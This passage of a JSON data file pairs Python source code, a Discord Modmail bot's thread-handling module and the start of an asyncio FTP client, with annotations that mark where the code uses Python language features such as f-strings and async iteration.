thread\"\n            em.description = str(e)\n            em.add_field(name=\"Recipient\", value=recipient.mention)\n            if log_channel is not None:\n                return await log_channel.send(embed=em)\n        self._channel = channel\n        try:\n            log_url, log_data = await asyncio.gather(\n                self.bot.api.create_log_entry(recipient, channel, creator or recipient),\n                self.bot.api.get_user_logs(recipient.id),\n            )\n            log_count = sum(1 for log in log_data if not log[\"open\"])\n        except:  \n            log_url = log_count = None\n        if creator:\n            mention = None\n        else:\n            mention = self.bot.config.get(\"mention\", \"@here\")\n        async def send_genesis_message():\n            info_embed = self.manager.format_info_embed(\n                recipient, log_url, log_count, discord.Color.green()\n            )\n            try:\n                msg = await channel.send(mention, embed=info_embed)\n                self.bot.loop.create_task(msg.pin())\n                self.genesis_message = msg\n            except Exception as e:\n                pass\n            finally:\n                self.ready = True\n                self.bot.dispatch(\"thread_ready\", self)\n        await channel.edit(topic=f\"User ID: {recipient.id}\")\n        self.bot.loop.create_task(send_genesis_message())\n        thread_creation_response = self.bot.config.get(\n            \"thread_creation_response\",\n            \"The staff team will get back to you as soon as possible.\",\n        )\n        embed = discord.Embed(\n            color=self.bot.mod_color,\n            description=thread_creation_response,\n            timestamp=channel.created_at,\n        )\n        footer = \"Your message has been sent\"\n        if not self.bot.config.get(\"disable_recipient_thread_close\"):\n            footer = \"Click the lock to close the thread\"\n        footer = self.bot.config.get(\"thread_creation_footer\", footer)\n        embed.set_footer(text=footer, icon_url=self.bot.guild.icon_url)\n        embed.title = self.bot.config.get(\"thread_creation_title\", \"Thread Created\")\n        if creator is None:\n            msg = await recipient.send(embed=embed)\n            if not self.bot.config.get(\"disable_recipient_thread_close\"):\n                close_emoji = self.bot.config.get(\"close_emoji\", \"\ud83d\udd12\")\n                close_emoji = await self.bot.convert_emoji(close_emoji)\n                await msg.add_reaction(close_emoji)\n    def _close_after(self, closer, silent, delete_channel, message):\n        return self.bot.loop.create_task(\n            self._close(closer, silent, delete_channel, message, True)\n        )\n    async def close(\n        self,\n        *,\n        closer: typing.Union[discord.Member, discord.User],\n        after: int = 0,\n        silent: bool = False,\n        delete_channel: bool = True,\n        message: str = None,\n        auto_close: bool = False,\n    ) -> None:\n        await self.cancel_closure(auto_close)\n        if after > 0:\n            await self.bot.config.update()\n            now = datetime.utcnow()\n            items = {\n                \"time\": (now + timedelta(seconds=after)).isoformat(),\n                \"closer_id\": closer.id,\n                \"silent\": silent,\n                \"delete_channel\": delete_channel,\n                \"message\": message,\n                \"auto_close\": auto_close,\n            }\n            self.bot.config.closures[str(self.id)] = items\n            await self.bot.config.update()\n            task = self.bot.loop.call_later(\n                after, self._close_after, closer, silent, delete_channel, message\n            )\n            if auto_close:\n                self.auto_close_task = task\n            else:\n                self.close_task = task\n        else:\n            await self._close(closer, silent, delete_channel, message)\n    async def _close(\n        self, closer, silent=False, delete_channel=True, message=None, scheduled=False\n    ):\n        del self.manager.cache[self.id]\n        await self.cancel_closure(all=True)\n        if str(self.id) in self.bot.config.subscriptions:\n            del self.bot.config.subscriptions[str(self.id)]\n        log_data = await self.bot.api.post_log(\n            self.channel.id,\n            {\n                \"open\": False,\n                \"closed_at\": str(datetime.utcnow()),\n                \"close_message\": message if not silent else None,\n                \"closer\": {\n                    \"id\": str(closer.id),\n                    \"name\": closer.name,\n                    \"discriminator\": closer.discriminator,\n                    \"avatar_url\": str(closer.avatar_url),\n                    \"mod\": True,\n                },\n            },\n        )\n        if log_data is not None and isinstance(log_data, dict):\n            prefix = os.getenv(\"LOG_URL_PREFIX\", \"/logs\")\n            if prefix == \"NONE\":\n                prefix = \"\"\n            log_url = f\"{self.bot.config.log_url.strip('/')}{prefix}/{log_data['key']}\"\n            if log_data[\"messages\"]:\n                content = str(log_data[\"messages\"][0][\"content\"])\n                sneak_peak = content.replace(\"\\n\", \"\")\n            else:\n                sneak_peak = \"No content\"\n            desc = f\"[`{log_data['key']}`]({log_url}): \"\n            desc += truncate(sneak_peak, max=75 - 13)\n        else:\n            desc = \"Could not resolve log url.\"\n            log_url = None\n        embed = discord.Embed(description=desc, color=discord.Color.red())\n        if self.recipient is not None:\n            user = f\"{self.recipient} (`{self.id}`)\"\n        else:\n            user = f\"`{self.id}`\"\n        if self.id == closer.id:\n            _closer = \"the Recipient\"\n        else:\n            _closer = f\"{closer} ({closer.id})\"\n        embed.title = user\n        event = \"Thread Closed as Scheduled\" if scheduled else \"Thread Closed\"\n        embed.set_footer(text=f\"{event} by {_closer}\")\n        embed.timestamp = datetime.utcnow()\n        tasks = [self.bot.config.update()]\n        try:\n            tasks.append(self.bot.log_channel.send(embed=embed))\n        except (ValueError, AttributeError):\n            pass\n        embed = discord.Embed(\n            title=self.bot.config.get(\"thread_close_title\", \"Thread Closed\"),\n            color=discord.Color.red(),\n            timestamp=datetime.utcnow(),\n        )\n        if not message:\n            if self.id == closer.id:\n                message = self.bot.config.get(\n                    \"thread_self_close_response\", \"You have closed this Modmail thread.\"\n                )\n            else:\n                message = self.bot.config.get(\n                    \"thread_close_response\",\n                    \"{closer.mention} has closed this Modmail thread.\",\n                )\n        message = message.format(closer=closer, loglink=log_url, logkey=log_data[\"key\"] if log_data else None)\n        embed.description = message\n        footer = self.bot.config.get(\n            \"thread_close_footer\", \"Replying will create a new thread\"\n        )\n        embed.set_footer(text=footer, icon_url=self.bot.guild.icon_url)\n        if not silent and self.recipient is not None:\n            tasks.append(self.recipient.send(embed=embed))\n        if delete_channel:\n            tasks.append(self.channel.delete())\n        await asyncio.gather(*tasks)\n    async def cancel_closure(self, auto_close: bool = False, all: bool = False) -> None:\n        if self.close_task is not None and (not auto_close or all):\n            self.close_task.cancel()\n            self.close_task = None\n        if self.auto_close_task is not None and (auto_close or all):\n            self.auto_close_task.cancel()\n            self.auto_close_task = None\n        to_update = self.bot.config.closures.pop(str(self.id), None)\n        if to_update is not None:\n            await self.bot.config.update()\n    @staticmethod\n    async def _find_thread_message(channel, message_id):\n        async for msg in channel.history():\n            if not msg.embeds:\n                continue\n            embed = msg.embeds[0]\n            if embed and embed.author and embed.author.url:\n                if str(message_id) == str(embed.author.url).split(\"/\")[-1]:\n                    return msg\n    async def _fetch_timeout(\n        self\n    ) -> typing.Union[None, isodate.duration.Duration, timedelta]:\n        timeout = self.bot.config.get(\"thread_auto_close\")\n        if timeout is None:\n            return timeout\n        else:\n            try:\n                timeout = isodate.parse_duration(timeout)\n            except isodate.ISO8601Error:\n                logger.warning(\n                    \"The auto_close_thread limit needs to be a \"\n                    \"ISO-8601 duration formatted duration string \"\n                    'greater than 0 days, not \"%s\".',\n                    str(timeout),\n                )\n                del self.bot.config.cache[\"thread_auto_close\"]\n                await self.bot.config.update()\n                timeout = None\n        return timeout\n    async def _restart_close_timer(self):\n        timeout = await self._fetch_timeout()\n        if timeout is None:\n            return\n        seconds = timeout.total_seconds()\n        reset_time = datetime.utcnow() + timedelta(seconds=seconds)\n        human_time = human_timedelta(dt=reset_time)\n        close_message = self.bot.config.get(\n            \"thread_auto_close_response\",\n            f\"This thread has been closed automatically due to inactivity \"\n            f\"after {human_time}.\",\n        )\n        time_marker_regex = \"%t\"\n        if len(re.findall(time_marker_regex, close_message)) == 1:\n            close_message = re.sub(time_marker_regex, str(human_time), close_message)\n        elif len(re.findall(time_marker_regex, close_message)) > 1:\n            logger.warning(\n                \"The thread_auto_close_response should only contain one\"\n                f\" '{time_marker_regex}' to specify time.\"\n            )\n        await self.close(\n            closer=self.bot.user, after=seconds, message=close_message, auto_close=True\n        )\n    async def edit_message(self, message_id: int, message: str) -> None:\n        recipient_msg, channel_msg = await asyncio.gather(\n            self._find_thread_message(self.recipient, message_id),\n            self._find_thread_message(self.channel, message_id),\n        )\n        channel_embed = channel_msg.embeds[0]\n        channel_embed.description = message\n        tasks = [channel_msg.edit(embed=channel_embed)]\n        if recipient_msg:\n            recipient_embed = recipient_msg.embeds[0]\n            recipient_embed.description = message\n            tasks.append(recipient_msg.edit(embed=recipient_embed))\n        await asyncio.gather(*tasks)\n    async def delete_message(self, message_id):\n        msg_recipient, msg_channel = await asyncio.gather(\n            self._find_thread_message(self.recipient, message_id),\n            self._find_thread_message(self.channel, message_id),\n        )\n        await asyncio.gather(msg_recipient.delete(), msg_channel.delete())\n    async def note(self, message: discord.Message) -> None:\n        if not message.content and not message.attachments:\n            raise MissingRequiredArgument(param(name=\"msg\"))\n        _, msg = await asyncio.gather(\n            self.bot.api.append_log(message, self.channel.id, type_=\"system\"),\n            self.send(message, self.channel, note=True),\n        )\n        return msg\n    async def reply(self, message: discord.Message, anonymous: bool = False) -> None:\n        if not message.content and not message.attachments:\n            raise MissingRequiredArgument(param(name=\"msg\"))\n        if all(not g.get_member(self.id) for g in self.bot.guilds):\n            return await message.channel.send(\n                embed=discord.Embed(\n                    color=discord.Color.red(),\n                    description=\"Your message could not be delivered since \"\n                    \"the recipient shares no servers with the bot.\",\n                )\n            )\n        tasks = []\n        try:\n            await self.send(\n                message, destination=self.recipient, from_mod=True, anonymous=anonymous\n            )\n        except Exception:\n            logger.info(error(\"Message delivery failed:\"), exc_info=True)\n            tasks.append(\n                message.channel.send(\n                    embed=discord.Embed(\n                        color=discord.Color.red(),\n                        description=\"Your message could not be delivered as \"\n                        \"the recipient is only accepting direct \"\n                        \"messages from friends, or the bot was \"\n                        \"blocked by the recipient.\",\n                    )\n                )\n            )\n        else:\n            tasks.append(\n                self.send(\n                    message,\n                    destination=self.channel,\n                    from_mod=True,\n                    anonymous=anonymous,\n                )\n            )\n            tasks.append(\n                self.bot.api.append_log(\n                    message,\n                    self.channel.id,\n                    type_=\"anonymous\" if anonymous else \"thread_message\",\n                )\n            )\n            if self.close_task is not None:\n                await self.cancel_closure()\n                tasks.append(\n                    self.channel.send(\n                        embed=discord.Embed(\n                            color=discord.Color.red(),\n                            description=\"Scheduled close has been cancelled.\",\n                        )\n                    )\n                )\n        await asyncio.gather(*tasks)\n    async def send(\n        self,\n        message: discord.Message,\n        destination: typing.Union[\n            discord.TextChannel, discord.DMChannel, discord.User, discord.Member\n        ] = None,\n        from_mod: bool = False,\n        note: bool = False,\n        anonymous: bool = False,\n    ) -> None:\n        self.bot.loop.create_task(\n            self._restart_close_timer()\n        )  \n        if self.close_task is not None:\n            self.bot.loop.create_task(self.cancel_closure())\n            self.bot.loop.create_task(\n                self.channel.send(\n                    embed=discord.Embed(\n                        color=discord.Color.red(),\n                        description=\"Scheduled close has been cancelled.\",\n                    )\n                )\n            )\n        if not self.ready:\n            await self.wait_until_ready()\n        if not from_mod and not note:\n            self.bot.loop.create_task(self.bot.api.append_log(message, self.channel.id))\n        destination = destination or self.channel\n        author = message.author\n        embed = discord.Embed(description=message.content, timestamp=message.created_at)\n        system_avatar_url = (\n            \"https://discordapp.com/assets/f78426a064bc9dd24847519259bc42af.png\"\n        )\n        if not note:\n            if (\n                anonymous\n                and from_mod\n                and not isinstance(destination, discord.TextChannel)\n            ):\n                tag = self.bot.config.get(\"mod_tag\", str(message.author.top_role))\n                name = self.bot.config.get(\"anon_username\", tag)\n                avatar_url = self.bot.config.get(\n                    \"anon_avatar_url\", self.bot.guild.icon_url\n                )\n            else:\n                name = str(author)\n                avatar_url = author.avatar_url\n            embed.set_author(name=name, icon_url=avatar_url, url=message.jump_url)\n        else:\n            embed.set_author(\n                name=f\"Note ({author.name})\",\n                icon_url=system_avatar_url,\n                url=message.jump_url,\n            )\n        delete_message = not bool(message.attachments)\n        attachments = [(a.url, a.filename) for a in message.attachments]\n        images = [x for x in attachments if is_image_url(*x)]\n        attachments = [x for x in attachments if not is_image_url(*x)]\n        image_links = [\n            (link, None)\n            for link in re.findall(\n                r\"http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+\",\n                message.content,\n            )\n        ]\n        image_links = [x for x in image_links if is_image_url(*x)]\n        images.extend(image_links)\n        embedded_image = False\n        prioritize_uploads = any(i[1] is not None for i in images)\n        additional_images = []\n        additional_count = 1\n        for att in images:\n            if not prioritize_uploads or (\n                is_image_url(*att) and not embedded_image and att[1]\n            ):\n                embed.set_image(url=att[0])\n                if att[1]:\n                    embed.add_field(name=\"Image\", value=f\"[{att[1]}]({att[0]})\")\n                embedded_image = True\n            elif att[1] is not None:\n                if note:\n                    color = discord.Color.blurple()\n                elif from_mod:\n                    color = self.bot.mod_color\n                else:\n                    color = self.bot.recipient_color\n                img_embed = discord.Embed(color=color)\n                img_embed.set_image(url=att[0])\n                img_embed.title = att[1]\n                img_embed.url = att[0]\n                img_embed.set_footer(\n                    text=f\"Additional Image Upload ({additional_count})\"\n                )\n                img_embed.timestamp = message.created_at\n                additional_images.append(destination.send(embed=img_embed))\n                additional_count += 1\n        file_upload_count = 1\n        for att in attachments:\n            embed.add_field(\n                name=f\"File upload ({file_upload_count})\", value=f\"[{att[1]}]({att[0]})\"\n            )\n            file_upload_count += 1\n        if from_mod:\n            embed.color = self.bot.mod_color  \n            if anonymous and isinstance(destination, discord.TextChannel):\n                embed.set_footer(text=\"Anonymous Reply\")\n            elif not anonymous:\n                tag = self.bot.config.get(\"mod_tag\", str(message.author.top_role))\n                embed.set_footer(text=tag)  \n            else:\n                embed.set_footer(text=self.bot.config.get(\"anon_tag\", \"Response\"))\n        elif note:\n            embed.color = discord.Color.blurple()  \n        else:\n            embed.set_footer(text=f\"Recipient\")\n            embed.color = self.bot.recipient_color  \n        await destination.trigger_typing()\n        if not from_mod and not note:\n            mentions = self.get_notifications()\n        else:\n            mentions = None\n        _msg = await destination.send(mentions, embed=embed)\n        if additional_images:\n            self.ready = False\n            await asyncio.gather(*additional_images)\n            self.ready = True\n        if delete_message:\n            self.bot.loop.create_task(ignore(message.delete()))\n        return _msg\n    def get_notifications(self) -> str:\n        config = self.bot.config\n        key = str(self.id)\n        mentions = []\n        mentions.extend(config[\"subscriptions\"].get(key, []))\n        if key in config[\"notification_squad\"]:\n            mentions.extend(config[\"notification_squad\"][key])\n            del config[\"notification_squad\"][key]\n            self.bot.loop.create_task(config.update())\n        return \" \".join(mentions)\nclass ThreadManager:\n    def __init__(self, bot):\n        self.bot = bot\n        self.cache = {}\n    async def populate_cache(self) -> None:\n        for channel in self.bot.modmail_guild.text_channels:\n            if (\n                channel.category != self.bot.main_category\n                and not self.bot.using_multiple_server_setup\n            ):\n                continue\n            await self.find(channel=channel)\n    def __len__(self):\n        return len(self.cache)\n    def __iter__(self):\n        return iter(self.cache.values())\n    def __getitem__(self, item: str) -> Thread:\n        return self.cache[item]\n    async def find(\n        self,\n        *,\n        recipient: typing.Union[discord.Member, discord.User] = None,\n        channel: discord.TextChannel = None,\n        recipient_id: int = None,\n    ) -> Thread:\n        if recipient is None and channel is not None:\n            thread = self._find_from_channel(channel)\n            if thread is None:\n                id, thread = next(((k, v) for k, v in self.cache.items() if v.channel == channel), (-1, None))\n                if thread is not None:\n                    logger.debug('Found thread with tempered ID.')\n                    await channel.edit(topic=f\"User ID: {id}\")\n            return thread\n        thread = None\n        if recipient:\n            recipient_id = recipient.id\n        try:\n            thread = self.cache[recipient_id]\n            if not thread.channel or not self.bot.get_channel(thread.channel.id):\n                self.bot.loop.create_task(\n                    thread.close(\n                        closer=self.bot.user, silent=True, delete_channel=False\n                    )\n                )\n                thread = None\n        except KeyError:\n            channel = discord.utils.get(\n                self.bot.modmail_guild.text_channels, topic=f\"User ID: {recipient_id}\"\n            )\n            if channel:\n                thread = Thread(self, recipient or recipient_id, channel)\n                self.cache[recipient_id] = thread\n                thread.ready = True\n        return thread\n    def _find_from_channel(self, channel):\n        user_id = -1\n        if channel.topic:\n            user_id = match_user_id(channel.topic)\n        if user_id != -1:\n            if user_id in self.cache:\n                return self.cache[user_id]\n            recipient = self.bot.get_user(user_id)\n            if recipient is None:\n                self.cache[user_id] = thread = Thread(self, user_id, channel)\n            else:\n                self.cache[user_id] = thread = Thread(self, recipient, channel)\n            thread.ready = True\n            return thread\n    def create(\n        self,\n        recipient: typing.Union[discord.Member, discord.User],\n        *,\n        creator: typing.Union[discord.Member, discord.User] = None,\n        category: discord.CategoryChannel = None,\n    ) -> Thread:\n        thread = Thread(self, recipient)\n        self.cache[recipient.id] = thread\n        self.bot.loop.create_task(thread.setup(creator=creator, category=category))\n        return thread\n    async def find_or_create(self, recipient) -> Thread:\n        return await self.find(recipient=recipient) or self.create(recipient)\n    def format_channel_name(self, author):\n        name = author.name.lower()\n        new_name = (\n            \"\".join(l for l in name if l not in string.punctuation and l.isprintable())\n            or \"null\"\n        )\n        new_name += f\"-{author.discriminator}\"\n        while new_name in [c.name for c in self.bot.modmail_guild.text_channels]:\n            new_name += \"-x\"  \n        return new_name\n    def format_info_embed(self, user, log_url, log_count, color):\n        member = self.bot.guild.get_member(user.id)\n        time = datetime.utcnow()\n        role_names = \"\"\n        if member:\n            sep_server = self.bot.using_multiple_server_setup\n            separator = \", \" if sep_server else \" \"\n            roles = []\n            for role in sorted(member.roles, key=lambda r: r.position):\n                if role.name == \"@everyone\":\n                    continue\n                fmt = role.name if sep_server else role.mention\n                roles.append(fmt)\n                if len(separator.join(roles)) > 1024:\n                    roles.append(\"...\")\n                    while len(separator.join(roles)) > 1024:\n                        roles.pop(-2)\n                    break\n            role_names = separator.join(roles)\n        embed = discord.Embed(color=color, description=user.mention, timestamp=time)\n        created = str((time - user.created_at).days)\n        embed.description += f\" was created {days(created)}\"\n        footer = \"User ID: \" + str(user.id)\n        embed.set_footer(text=footer)\n        embed.set_author(name=str(user), icon_url=user.avatar_url, url=log_url)\n        if member:\n            joined = str((time - member.joined_at).days)\n            embed.description += f\", joined {days(joined)}\"\n            if member.nick:\n                embed.add_field(name=\"Nickname\", value=member.nick, inline=True)\n            if role_names:\n                embed.add_field(name=\"Roles\", value=role_names, inline=True)\n        else:\n            embed.set_footer(text=f\"{footer} \u2022 (not in main server)\")\n        if log_count:\n            thread = \"thread\" if log_count == 1 else \"threads\"\n            embed.description += f\" with **{log_count}** past {thread}.\"\n        else:\n            embed.description += \".\"\n        mutual_guilds = [g for g in self.bot.guilds if user in g.members]\n        if user not in self.bot.guild.members or len(mutual_guilds) > 1:\n            embed.add_field(\n                name=\"Mutual Servers\", value=\", \".join(g.name for g in mutual_guilds)\n            )\n        return embed",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_563": [
                    [
                        19,
                        "        manager: \"ThreadManager\",",
                        "quoted annotation"
                    ]
                ],
                "pep_525": [
                    [
                        269,
                        275,
                        "async for",
                        "async for msg in channel.history():\n            if not msg.embeds:\n                continue\n            embed = msg.embeds[0]\n            if embed and embed.author and embed.author.url:\n                if str(message_id) == str(embed.author.url).split(\"/\")[-1]:\n                    return msg"
                    ]
                ],
                "pep_498": [
                    [
                        40,
                        "            f'Thread(recipient=\"{self.recipient or self.id}\", '"
                    ],
                    [
                        628,
                        "        new_name += f\"-{author.discriminator}\""
                    ],
                    [
                        653,
                        "        embed.description += f\" was created {days(created)}\""
                    ],
                    [
                        202,
                        "            log_url = f\"{self.bot.config.log_url.strip('/')}{prefix}/{log_data['key']}\""
                    ],
                    [
                        208,
                        "            desc = f\"[`{log_data['key']}`]({log_url}): \""
                    ],
                    [
                        215,
                        "            user = f\"{self.recipient} (`{self.id}`)\""
                    ],
                    [
                        217,
                        "            user = f\"`{self.id}`\""
                    ],
                    [
                        221,
                        "            _closer = f\"{closer} ({closer.id})\""
                    ],
                    [
                        305,
                        "            f\"This thread has been closed automatically due to inactivity \""
                    ],
                    [
                        659,
                        "            embed.description += f\", joined {days(joined)}\""
                    ],
                    [
                        668,
                        "            embed.description += f\" with **{log_count}** past {thread}.\""
                    ],
                    [
                        224,
                        "        embed.set_footer(text=f\"{event} by {_closer}\")"
                    ],
                    [
                        116,
                        "        await channel.edit(topic=f\"User ID: {recipient.id}\")"
                    ],
                    [
                        313,
                        "                \"The thread_auto_close_response should only contain one\""
                    ],
                    [
                        452,
                        "                name=f\"Note ({author.name})\","
                    ],
                    [
                        501,
                        "                name=f\"File upload ({file_upload_count})\", value=f\"[{att[1]}]({att[0]})\""
                    ],
                    [
                        501,
                        "                name=f\"File upload ({file_upload_count})\", value=f\"[{att[1]}]({att[0]})\""
                    ],
                    [
                        665,
                        "            embed.set_footer(text=f\"{footer} \u2022 (not in main server)\")"
                    ],
                    [
                        516,
                        "            embed.set_footer(text=f\"Recipient\")"
                    ],
                    [
                        588,
                        "                self.bot.modmail_guild.text_channels, topic=f\"User ID: {recipient_id}\""
                    ],
                    [
                        479,
                        "                    embed.add_field(name=\"Image\", value=f\"[{att[1]}]({att[0]})\")"
                    ],
                    [
                        493,
                        "                    text=f\"Additional Image Upload ({additional_count})\""
                    ],
                    [
                        572,
                        "                    await channel.edit(topic=f\"User ID: {id}\")"
                    ]
                ]
            }
        },
        "3": {
            "file": "import re\nimport collections\nimport pathlib\nimport logging\nimport datetime\nfrom functools import partial\ntry:\n    from siosocks.io.asyncio import open_connection\nexcept ImportError:\n    from asyncio import open_connection\nfrom . import errors\nfrom . import pathio\nfrom .common import (\n    ThrottleStreamIO,\n    StreamThrottle,\n    DEFAULT_PORT,\n    wrap_with_container,\n    END_OF_LINE,\n    DEFAULT_USER,\n    DEFAULT_PASSWORD,\n    DEFAULT_ACCOUNT,\n    DEFAULT_BLOCK_SIZE,\n    AsyncListerMixin,\n    async_enterable,\n    setlocale,\n    HALF_OF_YEAR_IN_SECONDS,\n)\n__all__ = (\n    \"BaseClient\",\n    \"Client\",\n    \"ClientSession\",\n    \"DataConnectionThrottleStreamIO\",\n    \"Code\",\n)\nlogger = logging.getLogger(__name__)\nclass Code(str):\n    def matches(self, mask):\n        return all(map(lambda m, c: not m.isdigit() or m == c, mask, self))\nclass DataConnectionThrottleStreamIO(ThrottleStreamIO):\n    def __init__(self, client, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        self.client = client\n    async def finish(self, expected_codes=\"2xx\", wait_codes=\"1xx\"):\n        self.close()\n        await self.client.command(None, expected_codes, wait_codes)\n    async def __aexit__(self, exc_type, exc, tb):\n        if exc is None:\n            await self.finish()\n        else:\n            self.close()\nclass BaseClient:\n    def __init__(self, *, socket_timeout=None,\n                 read_speed_limit=None, write_speed_limit=None,\n                 path_timeout=None, path_io_factory=pathio.PathIO,\n                 encoding=\"utf-8\", ssl=None, parse_list_line_custom=None,\n                 **siosocks_asyncio_kwargs):\n        self.socket_timeout = socket_timeout\n        self.throttle = StreamThrottle.from_limits(\n            read_speed_limit,\n            write_speed_limit,\n        )\n        self.path_timeout = path_timeout\n        self.path_io = path_io_factory(timeout=path_timeout)\n        self.encoding = encoding\n        self.stream = None\n        self.ssl = ssl\n        self.parse_list_line_custom = parse_list_line_custom\n        self._open_connection = partial(open_connection, ssl=self.ssl,\n                                        **siosocks_asyncio_kwargs)\n    async def connect(self, host, port=DEFAULT_PORT):\n        self.server_host = host\n        self.server_port = port\n        reader, writer = await self._open_connection(host, port)\n        self.stream = ThrottleStreamIO(\n            reader,\n            writer,\n            throttles={\"_\": self.throttle},\n            timeout=self.socket_timeout,\n        )\n    def close(self):\n        if self.stream is not None:\n            self.stream.close()\n    async def parse_line(self):\n        line = await self.stream.readline()\n        if not line:\n            self.stream.close()\n            raise ConnectionResetError\n        s = line.decode(encoding=self.encoding).rstrip()\n        logger.info(s)\n        return Code(s[:3]), s[3:]\n    async def parse_response(self):\n        code, rest = await self.parse_line()\n        info = [rest]\n        curr_code = code\n        while rest.startswith(\"-\") or not curr_code.isdigit():\n            curr_code, rest = await self.parse_line()\n            if curr_code.isdigit():\n                info.append(rest)\n                if curr_code != code:\n                    raise errors.StatusCodeError(code, curr_code, info)\n            else:\n                info.append(curr_code + rest)\n        return code, info\n    def check_codes(self, expected_codes, received_code, info):\n        if not any(map(received_code.matches, expected_codes)):\n            raise errors.StatusCodeError(expected_codes, received_code, info)\n    async def command(self, command=None, expected_codes=(), wait_codes=()):\n        expected_codes = wrap_with_container(expected_codes)\n        wait_codes = wrap_with_container(wait_codes)\n        if command:\n            logger.info(command)\n            message = command + END_OF_LINE\n            await self.stream.write(message.encode(encoding=self.encoding))\n        if expected_codes or wait_codes:\n            code, info = await self.parse_response()\n            while any(map(code.matches, wait_codes)):\n                code, info = await self.parse_response()\n            if expected_codes:\n                self.check_codes(expected_codes, code, info)\n            return code, info\n    @staticmethod\n    def parse_epsv_response(s):\n        matches = tuple(re.finditer(r\"\\((.)\\1\\1\\d+\\1\\)\", s))\n        s = matches[-1].group()\n        port = int(s[4:-2])\n        return None, port\n    @staticmethod\n    def parse_pasv_response(s):\n        sub, *_ = re.findall(r\"[^(]*\\(([^)]*)\", s)\n        nums = tuple(map(int, sub.split(\",\")))\n        ip = \".\".join(map(str, nums[:4]))\n        port = (nums[4] << 8) | nums[5]\n        return ip, port\n    @staticmethod\n    def parse_directory_response(s):\n        seq_quotes = 0\n        start = False\n        directory = \"\"\n        for ch in s:\n            if not start:\n                if ch == \"\\\"\":\n                    start = True\n            else:\n                if ch == \"\\\"\":\n                    seq_quotes += 1\n                else:\n                    if seq_quotes == 1:\n                        break\n                    elif seq_quotes == 2:\n                        seq_quotes = 0\n                        directory += '\"'\n                    directory += ch\n        return pathlib.PurePosixPath(directory)\n    @staticmethod\n    def parse_unix_mode(s):\n        parse_rw = {\"rw\": 6, \"r-\": 4, \"-w\": 2, \"--\": 0}\n        mode = 0\n        mode |= parse_rw[s[0:2]] << 6\n        mode |= parse_rw[s[3:5]] << 3\n        mode |= parse_rw[s[6:8]]\n        if s[2] == \"s\":\n            mode |= 0o4100\n        elif s[2] == \"x\":\n            mode |= 0o0100\n        elif s[2] != \"-\":\n            raise ValueError\n        if s[5] == \"s\":\n            mode |= 0o2010\n        elif s[5] == \"x\":\n            mode |= 0o0010\n        elif s[5] != \"-\":\n            raise ValueError\n        if s[8] == \"t\":\n            mode |= 0o1000\n        elif s[8] == \"x\":\n            mode |= 0o0001\n        elif s[8] != \"-\":\n            raise ValueError\n        return mode\n    @staticmethod\n    def format_date_time(d):\n        return d.strftime(\"%Y%m%d%H%M00\")\n    def parse_ls_date(self, s, *, now=None):\n        with setlocale(\"C\"):\n            try:\n                if now is None:\n                    now = datetime.datetime.now()\n                d = datetime.datetime.strptime(s, \"%b %d %H:%M\")\n                d = d.replace(year=now.year)\n                diff = (now - d).total_seconds()\n                if diff > HALF_OF_YEAR_IN_SECONDS:\n                    d = d.replace(year=now.year + 1)\n                elif diff < -HALF_OF_YEAR_IN_SECONDS:\n                    d = d.replace(year=now.year - 1)\n            except ValueError:\n                d = datetime.datetime.strptime(s, \"%b %d  %Y\")\n        return self.format_date_time(d)\n    def parse_list_line_unix(self, b):\n        s = b.decode(encoding=self.encoding).rstrip()\n        info = {}\n        if s[0] == \"-\":\n            info[\"type\"] = \"file\"\n        elif s[0] == \"d\":\n            info[\"type\"] = \"dir\"\n        elif s[0] == \"l\":\n            info[\"type\"] = \"link\"\n        else:\n            info[\"type\"] = \"unknown\"\n        info[\"unix.mode\"] = self.parse_unix_mode(s[1:10])\n        s = s[10:].lstrip()\n        i = s.index(\" \")\n        info[\"unix.links\"] = s[:i]\n        if not info[\"unix.links\"].isdigit():\n            raise ValueError\n        s = s[i:].lstrip()\n        i = s.index(\" \")\n        info[\"unix.owner\"] = s[:i]\n        s = s[i:].lstrip()\n        i = s.index(\" \")\n        info[\"unix.group\"] = s[:i]\n        s = s[i:].lstrip()\n        i = s.index(\" \")\n        info[\"size\"] = s[:i]\n        if not info[\"size\"].isdigit():\n            raise ValueError\n        s = s[i:].lstrip()\n        info[\"modify\"] = self.parse_ls_date(s[:12])\n        s = s[12:].strip()\n        if info[\"type\"] == \"link\":\n            i = s.rindex(\" -> \")\n            link_dst = s[i + 4:]\n            link_src = s[:i]\n            i = -2 if link_dst[-1] == \"\\'\" or link_dst[-1] == \"\\\"\" else -1\n            info[\"type\"] = \"dir\" if link_dst[i] == \"/\" else \"file\"\n            s = link_src\n        return pathlib.PurePosixPath(s), info\n    def parse_list_line_windows(self, b):\n        line = b.decode(encoding=self.encoding).rstrip(\"\\r\\n\")\n        date_time_end = line.index(\"M\")\n        date_time_str = line[:date_time_end + 1].strip().split(\" \")\n        date_time_str = \" \".join([x for x in date_time_str if len(x) > 0])\n        line = line[date_time_end + 1:].lstrip()\n        with setlocale(\"C\"):\n            strptime = datetime.datetime.strptime\n            date_time = strptime(date_time_str, \"%m/%d/%Y %I:%M %p\")\n        info = {}\n        info[\"modify\"] = self.format_date_time(date_time)\n        next_space = line.index(\" \")\n        if line.startswith(\"<DIR>\"):\n            info[\"type\"] = \"dir\"\n        else:\n            info[\"type\"] = \"file\"\n            info[\"size\"] = line[:next_space].replace(\",\", \"\")\n            if not info[\"size\"].isdigit():\n                raise ValueError\n        filename = line[next_space:].lstrip()\n        if filename == \".\" or filename == \"..\":\n            raise ValueError\n        return pathlib.PurePosixPath(filename), info\n    def parse_list_line(self, b):\n        ex = []\n        parsers = (\n            self.parse_list_line_custom,\n            self.parse_list_line_unix,\n            self.parse_list_line_windows,\n        )\n        for parser in parsers:\n            if parser is None:\n                continue\n            try:\n                return parser(b)\n            except (ValueError, KeyError, IndexError) as e:\n                ex.append(e)\n        raise ValueError(\"All parsers failed to parse\", b, ex)\n    def parse_mlsx_line(self, b):\n        if isinstance(b, bytes):\n            s = b.decode(encoding=self.encoding)\n        else:\n            s = b\n        line = s.rstrip()\n        facts_found, _, name = line.partition(\" \")\n        entry = {}\n        for fact in facts_found[:-1].split(\";\"):\n            key, _, value = fact.partition(\"=\")\n            entry[key.lower()] = value\n        return pathlib.PurePosixPath(name), entry\nclass Client(BaseClient):\n    async def connect(self, host, port=DEFAULT_PORT):\n        await super().connect(host, port)\n        code, 